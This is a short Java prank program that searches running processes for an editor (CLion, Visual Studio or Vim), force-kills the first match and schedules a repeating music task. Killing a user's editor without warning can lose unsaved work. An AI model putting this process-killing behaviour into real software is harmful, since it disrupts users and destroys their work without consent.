package fr.sktechnology.tchoupi_42;

import fr.sktechnology.tchoupi_42.tasks.MusicLoopTask;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;

public class Tchoupi42 {

    public static void main(String[] args) {
        Stream<ProcessHandle> processes = ProcessHandle.allProcesses();
        ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();
        processes.filter(p -> p.info().command().filter(cmd -> cmd.contains("CLion") || cmd.contains("VisualStudio") || cmd.contains("Vim")).isPresent()).findFirst().ifPresent(clion ->
        {
            executorService.scheduleAtFixedRate(new MusicLoopTask(), 60, 22, TimeUnit.SECONDS);
            clion.destroyForcibly();
        });
    }
}
